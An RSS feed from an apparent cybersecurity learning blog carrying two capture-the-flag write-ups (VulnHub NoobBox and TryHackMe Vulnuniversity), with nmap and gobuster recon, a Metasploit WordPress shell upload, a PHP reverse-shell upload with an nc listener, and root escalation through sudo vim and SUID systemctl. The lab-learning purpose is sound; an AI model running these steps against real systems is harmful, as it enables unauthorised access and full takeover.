<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Impulsive Strikers | Cyber Security Learning</title>
    <link>/</link>
    <description>Recent content on Impulsive Strikers | Cyber Security Learning</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 05 Oct 2021 21:38:19 +0530</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>N00BBox</title>
      <link>/posts/vulnhub/noobbox/</link>
      <pubDate>Tue, 05 Oct 2021 21:38:19 +0530</pubDate>
      
      <guid>/posts/vulnhub/noobbox/</guid>
      <description>NoobBox Vulnhub Link
Discover User netdiscover to scan the local network for machine
netdiscover -i eth0 ![/static/img/vulnhub/noobbox/Pasted image 20211004231834.png]
 netdiscover is used to inspect your network&amp;rsquo;s ARP traffic, or find network addresses using auto scan mode, which will scan for common local networks. -i flag is used to specify the network interface, in this case eth0. Found IP of NoobBox: 192.168.1.9  Enumeration Nmap  Scan using nmap to discover open ports and services on the machine  nmap -sC -sV -v -oN common-ports.</description>
      <content>&lt;h1 id=&#34;noobbox&#34;&gt;NoobBox&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/noobbox-1,664/&#34;&gt;Vulnhub Link&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;discover&#34;&gt;Discover&lt;/h2&gt;
&lt;p&gt;User netdiscover to scan the local network for machine&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;netdiscover -i eth0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![/static/img/vulnhub/noobbox/Pasted image 20211004231834.png]&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;netdiscover is used to inspect your network&amp;rsquo;s ARP traffic, or find network addresses using auto scan mode, which will scan for common local networks.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-i&lt;/code&gt; flag is used to specify the network interface, in this case eth0.&lt;/li&gt;
&lt;li&gt;Found IP of NoobBox: &lt;code&gt;192.168.1.9&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
&lt;h3 id=&#34;nmap&#34;&gt;Nmap&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Scan using nmap to discover open ports and services on the machine&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sC -sV -v -oN common-ports.nmap 192.168.1.9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-sC&lt;/code&gt; flag is used to run default nmap scripts&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-sV&lt;/code&gt; flag is used to enumerate service versions&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v&lt;/code&gt; flag is used for verbose output&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-oN&lt;/code&gt; flag is used to output the result in nmap format to a file, in this file is named common-ports.nmap.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Result&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.92 scan initiated Mon Oct  4 22:07:03 2021 as: nmap -sC -sV -v -oN common-ports.nmap 192.168.1.9&lt;/span&gt;
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.1.9
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.035s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;999&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;conn-refused&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;enumerate-the-website&#34;&gt;Enumerate the Website&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Open the site on the browser, we get the default Apache webserver page
![[Pasted image 20211004233047.png]]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;We can run gobuster to enumerate the website further for directories.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://192.168.1.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o initial.gobuster
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211004233655.png]]&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;We can see that &lt;em&gt;&lt;strong&gt;/wordpress&lt;/strong&gt;&lt;/em&gt; is accessible.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;On navigating to the wordpress page, we see that the site is borked due to incorrect url mapping as shown below.
![[Pasted image 20211004234031.png]]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;On the page source we can see the borked urls as highlighted. The mentioned IP is not reachable from our end as it doesn&amp;rsquo;t exist.
![[Pasted image 20211004234140.png]]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;We see that in the wordpress page, there is a post, on navigating to the post, we are redirected to the unreachable url.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;We can edit the url to point to our machine ip to access page.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;In the page, we can see the post is created by &amp;ldquo;noobbox&amp;rdquo; user. This could be a username that we can try to access.
![[Pasted image 20211004234845.png]]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Possible user found: &lt;code&gt;noobbox&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;further-enumeration&#34;&gt;Further Enumeration&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;We can use gobuster again on the wordpress page to further enumerate the wordpress site with file extensions&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://192.168.1.9/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o wordpress.gobuster -x php,html,png,jpg,jpeg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;We do not find anything useful here, we continue with enumeration.
![[Pasted image 20211004235238.png]]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Next, we emumerate the base apache site for files using gobuster with file extensions&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://192.168.1.9 -w /usr/share/wordlists/dirb/common.txt -x php,html,png,jpg,jpeg -o files.gobuster
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211004235637.png]]&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;We get a lot of default apache files along with few files in the base directory with forbidden status (status code 403).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The files that are accessible are img.jpg and index.html (status code 200).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;On accessing the img.jpg url, we get an image with characters, possibly a password?&amp;hellip;
![[Pasted image 20211005000038.png]] 
Image is blurred intentionally for the writeup purpose.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Possible credentials - &lt;code&gt;noobbox:[Redacted]&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;gaining-access&#34;&gt;Gaining Access&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;We cannot ssh into the box with the found credentials since ssh port is closed.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Since this is a wordpress site and we have the credentials we can try using metaspoilt to get a revershell.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Fire up metaspolit with &lt;code&gt;msfconsole&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Search for wordpress shell upload&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;search wp_admin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005001506.png]]&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;use &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#To use the module&lt;/span&gt;
show options &lt;span style=&#34;color:#75715e&#34;&gt;#To show the options that need to set (Required options)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005001819.png]]&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We need to set the RHOSTS, TARGETURI, Username &amp;amp; Password&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;set RHOSTS 192.168.1.9
set TARGET /wordpress/
set USERNAME noobbox
set PASSWORD &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Redacted&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#Password redacted for writeup purpose.&lt;/span&gt;
run &lt;span style=&#34;color:#75715e&#34;&gt;#To run the exploit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Once get the meterpreter shell, we can switch to a tty shell if preferred and get the user flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
ls -la
cat user.txt &lt;span style=&#34;color:#75715e&#34;&gt;# Read permission for all users&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005211559.png]]&lt;/p&gt;
&lt;h2 id=&#34;priviledge-escalation&#34;&gt;Priviledge Escalation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;We can use sudo command to check if we can run any binaries&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo -l
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;We see that we can run vim application as a root user.&lt;/li&gt;
&lt;li&gt;We can check GTFObins for vim privesc routes&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo vim -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:!/bin/bash&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#Get the root shell after providing noobbox&amp;#39;s pwd.&lt;/span&gt;
whoami &lt;span style=&#34;color:#75715e&#34;&gt;#root&lt;/span&gt;
cat /root.txt &lt;span style=&#34;color:#75715e&#34;&gt;# get the root flag&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005212725.png]]&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Vulnuniversity</title>
      <link>/posts/thm/vulnuniversity/</link>
      <pubDate>Wed, 29 Sep 2021 12:04:29 +0530</pubDate>
      
      <guid>/posts/thm/vulnuniversity/</guid>
      <description>Nmap Results nmap -sC -sV -v -oN initial.log 10.10.170.203 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA) | 256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA) |_ 256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 |_http-server-header: squid/3.5.12 |_http-title: ERROR: The requested URL could not be retrieved 3333/tcp open http Apache httpd 2.</description>
      <content>&lt;h3 id=&#34;nmap-results&#34;&gt;Nmap Results&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sC -sV -v -oN initial.log 10.10.170.203
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Vuln University
|_http-server-header: Apache/2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Samba 4.3.11-Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|   Domain name: &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|   FQDN: vulnuniversity
|_  System time: 2021-09-17T12:50:03-04:00
| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unknown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| Names:
|   VULNUNIVERSITY&amp;lt;00&amp;gt;   Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   VULNUNIVERSITY&amp;lt;03&amp;gt;   Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   VULNUNIVERSITY&amp;lt;20&amp;gt;   Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;01&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;02__MSBROWSE__&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;02&amp;lt;01&amp;gt;  Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
|   WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
|   WORKGROUP&amp;lt;1d&amp;gt;        Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|_  WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
| smb2-time: 
|   date: 2021-09-17T16:50:03
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;gobuster&#34;&gt;GoBuster&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://10.10.170.203:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
Gobuster v3.1.0
by OJ Reeves &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@firefart&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Url:                     http://10.10.170.203:3333
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Method:                  GET
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Threads:                 &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Negative Status codes:   &lt;span style=&#34;color:#ae81ff&#34;&gt;404&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User Agent:              gobuster/3.1.0
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Timeout:                 10s
&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
2021/09/17 22:29:36 Starting gobuster in directory enumeration mode
&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
/images               &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 322&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.170.203:3333/images/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
/css                  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 319&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.170.203:3333/css/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;   
/js                   &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 318&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.170.203:3333/js/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;    
/fonts                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 321&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.170.203:3333/fonts/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 
/internal             &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 324&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.170.203:3333/internal/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;enumeration-and-gaining-access&#34;&gt;Enumeration and Gaining Access&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;There is a file upload on &lt;code&gt;/internal&lt;/code&gt; page&lt;/li&gt;
&lt;li&gt;We can use this to upload a php reverse shell using the &lt;code&gt;.phtml&lt;/code&gt; file extension&lt;/li&gt;
&lt;li&gt;Get the php rev shell code from pentestmonkey and change the ip to point to tun0 of LHOST&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nc -lvnp 1234&lt;/code&gt; to listen for shell connection when navigated to /internal/uploads/rev-shell.phtml (file that was uploaded)&lt;/li&gt;
&lt;li&gt;Get the reverse shell as www-data user.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ls /home&lt;/code&gt; to view the users -&amp;gt; found bill&lt;/li&gt;
&lt;li&gt;use &lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt; to get a ptty shell&lt;/li&gt;
&lt;li&gt;use &lt;code&gt;export TERM=xterm&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;get the flag from user.txt file in bill home folder -&amp;gt; flag redacted&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;privesc&#34;&gt;PrivEsc&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Try to check what can run using sudo with &lt;code&gt;sudo -l&lt;/code&gt;. -&amp;gt; cant use in a php reverse shell.&lt;/li&gt;
&lt;li&gt;Try &lt;code&gt;find / -user root -perm -4000 -exec ls -ldb {} \;&lt;/code&gt; to find files with suid set -&amp;gt; found /bin/systemctl&lt;/li&gt;
&lt;li&gt;Use GTFOBINS to check for systemctl for privesc&lt;/li&gt;
&lt;li&gt;We can use the environment variable method to create a system service and assign that to the env variable.&lt;/li&gt;
&lt;/ul&gt;
